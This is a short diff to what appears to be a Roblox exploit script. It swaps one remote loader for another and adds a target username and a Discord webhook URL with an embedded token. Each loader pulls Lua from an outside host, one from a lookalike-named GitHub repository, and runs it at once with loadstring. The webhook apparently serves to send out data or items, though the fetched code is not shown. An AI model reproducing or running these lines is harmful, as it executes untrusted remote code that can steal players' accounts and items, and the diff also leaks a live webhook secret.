@@ -1,4 +1,6 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/nexus/main/Dupe"))() 
 
 getgenv().gui = false
-loadstring(game:HttpGet("https://egorikusa.space/e19ab5fc698973719e98aa41.lua", true))()
+Username = "User_boblex"
+Webhook = "https://discord.com/api/webhooks/1277429981659791410/VccbDVfCXx9sT9IChUPsWwzRp_jioH0AxxPvsJxwqzE3q7QEksEwiorZMe_n3SWvKAZA"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/doslobodydoedy/x/main/main.lua", true))()
